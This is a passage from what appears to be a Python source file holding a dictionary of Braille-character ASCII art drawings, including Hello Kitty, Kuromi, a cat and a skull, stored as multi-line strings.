⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⢀⠀⠀⠀⠀⠀⣠⣤⣤⣀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡾⠋⠀⠀⠀⢀⣠⠟⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠁⠡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠀⣠⡟⠁⣀⣤⠴⠾⡟⠁⠀⠀⠀⠀⢿⠉⢹⣿⣿⡋⠙⣿⠀⠀⠀⠀⠓⠂⠀⢷⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀
⡴⠚⠻⡶⠛⠉⠀⠀⢸⡇⠀⣠⠾⠷⣤⣈⠻⢿⣿⣿⣷⠖⠃⢀⣠⠤⠤⣄⡀⠀⠈⢧⣀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀
⠱⢤⠴⠃⠀⠀⠀⠀⠸⣧⢰⠿⣆⠀⠀⠈⠛⠶⢯⠿⠿⢞⠋⠁⠀⠀⠀⠀⠙⢷⡄⠀⠈⠙⠓⢦⣤⣀⡀⠀⠀⢹⣆⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⠀⢻⣿⣿⡧⠀⠀⠀⠀⠀⠙⢳⣦⣤⣀⣀⣀⠀⠀⠙⡆⠀⠀⢀⡾⠁⠈⠉⠙⠻⡇⠀⣸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⡀⠛⠟⠃⠀⠀⣀⡀⠀⠀⠈⢿⣿⣿⣿⠋⠀⠀⠀⡗⠀⣠⡾⠁⠀⠀⠀⠀⠀⠉⠉⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣦⣄⡀⠀⢀⡛⠛⠁⠀⠀⠀⠉⠉⠁⠀⠀⣠⣾⣥⠾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣞⢙⣿⣏⣁⣉⠛⠓⠾⠧⢤⣤⣤⣤⣤⣤⠤⠴⠶⠛⠛⠉⠈⠳⣦⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠉⡇⠀⠀⣀⣠⠴⢦⣄⠀⠀⠀⠀⣿⠉⠉⠉⠉⠉⠱⠤⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⢧⠖⠋⠁⠀⠀⠀⠈⠛⠦⣄⣀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢯⣨⠇⠀
"""
  ),
  
  "hellokitty": ( """
                 
                 ⠀⠀⠀⠀⠀⠀  ⢀⣠⣤⣤⣀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣠⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣟⣯⣟⡿⣷⡴⠞⠛⠉⠉⠉⢻⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡾⠁⠀⠈⠉⠙⠳⢦⣤⠴⠶⠖⠛⠛⣻⣿⣳⣟⣾⣾⣽⣻⣷⣀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣻⢞⣿⣯⣿⣿⣟⡿⣿⣶⣶⣾⢷⣿⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⢼⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⢯⣿⣹⣿⣿⣳⢾⣽⡳⣿⣿⣾⣻⠾⣽⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣷⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠛⠉⠻⣯⣿⣶⣿⣿⣿⡿⣽⣻⣽⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣽⢾⣽⣳⡿⢿⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠋⠉⠀⠘⣧⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣿⢦⡴⠤⠆
⠀⣀⣀⣼⣧⣄⣠⠀⠀⠀⠀⣠⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣦⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀
⠉⠉⠉⠈⣿⠀⠀⠀⠀⠀⠐⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠿⠀⠀⠀⠀⠐⢺⡿⠶⠦⠤⠀
⠀⠀⣀⣠⣼⣷⠶⠂⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⣾⢫⢽⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢀⡾⠀⠀⠀⠀⠀
⠀⠀⠁⠁⠀⠹⣦⣀⣠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣨⣟⠛⠷⢤⡄⠀⠀
⠀⠀⠀⠀⣠⣴⣿⠿⠛⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠏⠀⠈⠛⠳⣄⠀⠀⠀
⠀⠀⠀⠈⣿⠋⠀⠀⠀⠀⣿⠛⠶⢶⣤⣤⣤⣤⣀⣀⣀⣀⣠⣤⣤⣤⣴⣶⣿⡏⠉⠻⣆⠀⠀⠀⠀⢻⡀⠀⠀
⠀⠀⠀⠐⣿⠀⠀⠀⠀⣼⠃⠀⣠⣿⣿⣻⡽⣿⣦⡈⠀⠁⠀⠀⣠⣿⢯⣷⣻⣿⣆⠀⠻⣆⠀⠀⣠⡿⠀⠀⠀
⠀⠀⠀⠀⠘⢷⣄⣀⣼⠃⠀⢰⣿⣟⡶⠿⣿⣵⣻⢿⡿⣷⣾⢿⡿⣽⣻⠾⢷⣿⣿⣆⣀⣹⣧⠾⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠳⢶⣿⣟⣾⣧⣠⣾⣯⢯⣟⣽⣳⢯⣟⣽⣳⣿⣄⣴⣿⣞⣿⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣞⣧⣟⡿⣽⡞⣟⡾⢧⣟⣯⣞⣷⠿⠛⠉⠉⠉⠙⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣻⡼⣾⢽⣳⢿⣹⣟⣻⣞⣳⡿⠁⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣯⡽⣞⣯⣟⣾⣳⢯⣷⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠉⠉⠉⠙⠙⠋⠛⠛⠛⠛⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠹⣆⠀⠀⠀⠀⠀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠷⣤⣀⣀⢀⠀⢀⣀⣀⣴⠏⠀⠉⠛⠶⠶⠖⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠋⠉⠉⠉⠀⠀ 
"""
      
  ),
  
  "kuromi2": ( """
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣿⣿⣾⣿⠃
⢀⣴⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⢿⣿⡏⠀⠀
⢸⣿⣿⣽⣿⡄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⣦⣿⣿⣿⣻⣽⡾⣿⣿⠁⠀⠀
⠀⠙⠛⣿⣿⣿⣿⣷⣴⣆⣤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣤⣾⣿⣿⢿⣻⡷⣯⣷⢯⣟⣿⣷⠀⠀⠀
⠀⠀⠀⢿⣿⣾⣽⣻⣟⡿⣿⣿⣷⣿⣦⣠⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⣿⣟⡿⣾⣻⢯⣟⣷⣯⢿⣯⣿⣿⠀⠀⠀
⠀⠀⠀⢸⣿⣟⣾⢷⣻⣟⣷⢯⡿⣽⣻⣿⣿⣷⣿⡄⣀⣠⣤⣤⣴⣶⣶⣶⣶⣿⣶⣦⣽⣿⣟⣾⣟⡷⣿⣻⣽⡾⣽⣟⣾⣿⡏⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣯⣟⡿⣞⣯⣿⣻⣽⢷⣻⡾⣽⣿⣿⣿⡿⣿⣻⣟⣯⡿⣯⣟⣿⣻⣟⡿⣿⣿⣿⣿⣿⣷⣻⢷⣟⡿⣞⣯⣿⠁⠀⠀⠀
⠀⠀⠀⠀⢿⣿⣷⣻⣽⢿⣽⣞⣯⣟⡿⣽⣻⣽⣿⣿⢷⡿⣽⡷⣯⡷⠟⠛⠚⠓⠿⢾⣟⣷⣻⣞⡿⣿⣿⣿⣿⣾⣻⢿⣽⣿⠂⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⡽⣾⣻⢷⣯⣟⣾⣟⡿⣽⣳⡿⣯⣟⣿⣳⣿⠋⠀⠀⠀⠀⠀⠀⠀⢻⣯⡷⣟⣿⣳⣯⢿⣿⣷⣿⣻⣾⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⡿⣽⢯⣿⢾⣽⣳⣯⢿⣻⣽⣻⢷⣻⣷⣻⡇⢀⣶⡆⠀⠀⠀⣿⡧⢰⣿⣻⣽⢷⣻⣽⣯⣟⣿⣿⣟⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠿⣿⣿⣯⣿⣽⣷⣻⢿⣽⣳⣿⣻⣽⢾⣻⣽⣦⣉⣁⢀⣀⡀⢨⣴⣿⣯⣿⣾⣟⣯⣷⣟⣾⢯⣿⣯⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣟⣾⡽⣯⣟⣷⢯⣟⣾⣿⠿⠷⠿⣿⣿⣶⣿⣷⣿⡿⠛⠉⠀⠀⠉⠛⣷⣿⣾⣻⣽⣿⡥⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣟⣾⣽⣻⣽⣻⢾⣿⠟⠉⠀⠀⠀⠀⠀⠀⠉⠉⠋⠁⠀⠀⠀⠀⠀⣠⣞⡅⠙⣿⣽⡾⣿⡗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣯⡷⣿⣽⣳⣿⣿⠃⠨⣳⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⡆⠀⠘⣿⣟⣿⠯⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡽⣷⢯⣿⢾⡇⠀⠀⣿⣿⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡿⠃⠀⠀⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣽⣻⣽⣿⡇⠀⠀⠘⠿⠿⠃⠀⠀⠀⠀⢰⣻⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣾⣯⢷⡿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢆⡀⣀⡔⠀⠀⠀⠀⠀⠀⠀⣀⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣽⣿⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡩⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣀⣀⣀⣤⣤⣤⣴⣶⣾⣿⣿⣿⡄⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠙⣷⣿⣿⣿⣽⣯⣿⡿⣿⢿⡿⣿⣿⣿⣿⢿⣿⣻⣟⣿⠛⠛⢿⣿⢿⣏⣀⣽⠆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⠟⣿⠏⠀⠀⠀⠹⣿⣯⣿⣽⡷⠟⠉⠙⠻⠷⣿⣿⣟⣦⠀⢈⣷⠀⠉⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣆⠀⠀⢰⣄⡽⠿⡟⠉⠀⠀⠀⠀⠀⠀⢰⡏⠈⣿⡆⠾⢿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣿⣾⣾⣷⣾⣯⠉⠀⠀⣸⠟⢦⣴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠉⠋⢹⣇⣠⣾⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣽⣿⡿⣽⣿⣂⠙⠷⣶⡞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠟⢿⣿⣟⣿⣾⣴⣿⣷⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⢻⣿⡿⠆⠀⠀⠀⠀⠀⢠⣿⣧⠀⠀⠀⠀⠀⠀⠛⢷⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡏⠀⠀⠀⠀⠀⠀⠀⢸⣾⣯⡀⠀⠀⠀⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣤⣄⣀⣀⣀⣤⣴⠿⠃⠙⠻⠶⣶⣶⡶⢶⡶⠟⠁

"""              
  ),
  "hellokitty2": (""" 
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⢶⣶⣄⠀⣠⣴⣾⠿⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⡀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣾⠋⠀⠀⠈⠹⣿⡟⠉⠀⠀⠀⠘⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⠟⠉⠉⠉⠛⠻⢿⣶⠿⠿⠟⠛⠛⠛⣿⠇⠀⢠⣶⣶⣶⣿⣷⣦⣤⣀⣠⣤⣿⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠀⠀⢸⣿⣼⡿⠁⠀⠀⠙⣿⣯⡁⠀⠈⢿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣄⠀⠀⢙⣿⣷⡀⠀⠀⢠⣿⣿⣿⡆⠀⣾⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠋⠙⠻⠷⠾⣿⡟⠛⠋⠀⣴⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠷⡶⠿⠛⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣹⣷⣤⣤⣤⡄
⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⡀⠀⠀⠀⠘⠋⢹⣿⠀⠀⠀⠀
⠀⣀⣀⣤⣿⣧⣤⡄⠀⠀⠀⢀⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡷⠀⠀⠀⠀⢠⣼⣿⣤⣤⡤⠀
⠈⠛⠉⠉⠹⣿⠀⠀⠀⠀⠀⠸⣿⡿⠀⠀⠀⠀⠀⢀⣠⡤⣤⡀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⢀⣾⠏⠀⠀⠀⠀
⠀⠀⠀⣀⣤⣿⣷⠞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠷⠤⠼⣃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢛⣿⡿⢶⣤⣄⠀⠀
⠀⠀⠀⠉⠁⠀⠹⣷⣤⡴⠆⠀⠀⠀⠀⠀⢀⣤⣤⣤⣤⣤⣼⡟⣻⡇⠀⠀⠀⠀⠀⠀⣀⣴⡿⠋⠀⠀⠀⠉⠀⠀
⠀⠀⠀⠀⢀⣠⡾⠟⠛⠿⣶⣤⣤⣤⣄⣰⣿⣍⣀⡀⠀⠈⠙⠳⠿⢷⣦⣀⣠⣤⣶⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠋⠀⠀⠀⣰⡟⠉⠀⠀⠙⣿⣅⣉⣿⣁⣀⣠⣶⡀⠀⠀⠈⣿⡏⠁⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⠀⠀⠀⠀⠀⣿⣧⡽⠉⠛⢉⣉⣘⣷⣄⣰⣿⣿⠇⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡄⠀⠀⠀⠀⣻⡷⡄⣞⣳⠘⢦⣇⡈⠙⡿⢿⡇⠀⠀⠀⠀⢠⣿⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⡟⠉⢿⣦⣄⣠⣴⡿⠛⣡⣌⣿⢳⡞⠧⣿⣀⡙⠚⢿⣦⣄⣤⣴⠟⠙⢿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⡿⠀⠀⠀⠈⠉⠉⢹⣧⠈⠳⠞⡉⢻⡷⢦⠸⢭⣧⣤⡿⠋⠉⠉⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠈⣿⣆⠀⢾⣹⠆⠙⢫⣶⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠘⢿⣶⣤⣤⣴⣾⡿⠻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⠀⠀⠀⠀⠀⢀⣼⣿⣿⡿⠿⠿⣷⣶⣿⣷⡀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢷⣦⣤⣤⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠙⢿⣦⣤⣀⣤⣴⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀
"""
      
  ),
  
  "cutecat": ("""
              ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⣤⠟⡇⠀⠀⠀⠀⠀⠀⣠⣶⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣼⣿⡃⠀⠀⢀⡾⡃⠀⣿⠀⠀⠀⠀⢠⡼⠋⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠹⠟⠋⠁⣰⡟⣠⡇⠀⢻⡀⠀⢀⣴⠏⢀⡀⠘⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⠟⣶⣿⡇⠠⠸⣧⣠⠟⠁⢀⣾⡇⠀⣿⠀⠀⠀⠀⠀⠀⠀
⠐⣧⡀⠀⠀⠀⣸⠏⢾⠿⣿⡇⠀⠀⠙⠃⠀⢠⣾⣿⡇⠀⣿⡆⠀⠀⢀⣀⠀⠀
⠀⠀⠙⢦⣀⡾⢿⣶⣮⣅⡀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠅⠀⢹⣇⣠⠶⠛⠛⠀⠀
⠀⢠⣄⣀⣹⡇⠘⣿⣿⣿⠿⠆⠀⠒⢻⣾⣶⣶⣤⡀⠀⣠⣼⡟⠃⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣸⣧⠀⠀⠀⠀⠰⡆⠀⠀⠈⠿⣿⡿⡟⠻⠞⢯⣼⣇⣀⠀⠀⠀⠀⠀
⠀⠠⡾⠛⠁⠘⠷⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠁⠀⠉⠛⠶⣤⣀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⣿⣶⣶⣶⣶⣶⣶⠶⠛⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠙⠛⠛⠛⢻⣇⠀⠀⠀⠀⠉⠳⣦⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⡆⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡇⠀⠀⠀⡇⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⢸⠇⠀⠀⠀⣷⠀⠀⢹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⠴⠞⠛⠛⡆⠀⠀⠀⢸⣆⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣾⣋⢀⣀⣠⣴⣾⠇⠀⠀⣰⠟⠙⠶⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⢁⡴⠋⠀⠀⣠⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣤⣤⡴⠟⠁
"""     
  ),
  
  "skulldemon": ("""
                 
                 ⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⡀⠀
⠀⠀⢀⣾⡟⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡙⣿⡄
⠀⠀⣸⣿⠃⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⣹⣿
⠀⠀⣿⣿⡆⢚⢄⣀⣠⠤⠒⠈⠁⠀⠀⠈⠉⠐⠢⢄⡀⣀⢞⠀⣾⣿
⠀⠀⠸⣿⣿⣅⠄⠙⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠑⣄⣽⣿⡟
⠀⠀⠀⠘⢿⣿⣟⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣾⣿⣿⠏⠀
⠀⠀⠀⠀⣸⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⢻⠀⠀
⠀⠀⠀⠀⢿⠀⢃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⢸⠀⠀
⠀⠀⠀⠀⢸⢰⡿⢘⣦⣤⣀⠑⢦⡀⠀⣠⠖⣁⣤⣴⡊⢸⡇⡼⠀⠀
⠀⠀⠀⠀⠀⠾⡅⣿⣿⣿⣿⣿⠌⠁⠀⠁⢺⣿⣿⣿⣿⠆⣇⠃⠀⠀
⠀⠀⠀⠀⠀⢀⠂⠘⢿⣿⣿⡿⠀⣰⣦⠀⠸⣿⣿⡿⠋⠈⢀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⢠⣿⢻⣆⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀
